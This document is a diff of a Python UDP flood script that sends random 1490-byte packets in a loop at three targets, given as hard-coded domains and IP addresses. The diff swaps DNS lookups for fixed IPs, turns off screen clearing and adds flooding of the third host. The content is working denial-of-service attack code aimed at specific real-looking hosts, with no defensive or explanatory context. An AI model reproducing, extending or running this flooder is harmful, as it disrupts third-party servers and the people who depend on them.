@@ -13,14 +13,14 @@ import datetime
 
 
 # Platform info
-uname=system()
+#uname=system()
 
-if uname == "Windows":
-    cmd_clear_clear = 'cls'
-else:
-    cmd_clear = 'clear'
+#if uname == "Windows":
+#    cmd_clear_clear = 'cls'
+#else:
+#    cmd_clear = 'clear'
 
-os.system(cmd_clear)
+#os.system(cmd_clear)
 
 
 # Socket
@@ -29,7 +29,7 @@ bytes = random._urandom(1490)
 
 
 # Cast
-os.system(cmd_clear)
+#os.system(cmd_clear)
 print('\033[1;34mTo all of my children in whom Life flows abundant...')
 time.sleep(1)
 print('\033[1;34mTo all of my children to whom Death hath passed his judgement...')
@@ -65,14 +65,14 @@ time.sleep(1)
 
 # Get ip.
 url1 = "fwess.top"
-ip1 = socket.gethostbyname(url1)
-#ip1 = "163.187.32.26"
+#ip1 = socket.gethostbyname(url1)
+ip1 = "163.187.32.26"
 url2 = "ffwecc.top"
-ip2 = socket.gethostbyname(url2)
-#ip2 = "103.215.51.91"
+#ip2 = socket.gethostbyname(url2)
+ip2 = "103.215.51.91"
 url3 = "liwuhe51.top"
-ip3 = socket.gethostbyname(url3)
-#ip2 = "103.82.54.28"
+#ip3 = socket.gethostbyname(url3)
+ip3 = "103.82.54.28"
 
 
 
@@ -107,9 +107,9 @@ if port_mode == False:  # All ports.
                 print('\033[1;36m/wait %s'%(timeR))
                 sent = 1
                 time.sleep(timeR)
-                ip1 = socket.gethostbyname(url1)
-                ip2 = socket.gethostbyname(url2)
-                ip3 = socket.gethostbyname(url3)
+                #ip1 = socket.gethostbyname(url1)
+                #ip2 = socket.gethostbyname(url2)
+                #ip3 = socket.gethostbyname(url3)
                 #ip1 = "163.187.32.26"
                 #ip2 = "103.215.51.91"
                 #ip3 = "103.82.54.28"
@@ -120,6 +120,7 @@ if port_mode == False:  # All ports.
             
             sock.sendto(bytes, (str(ip1), port))
             sock.sendto(bytes, (str(ip2), port))
+            sock.sendto(bytes, (str(ip3), port))
             sent += 1
             #port += 1
             timeR = i + random.randint(0,20)
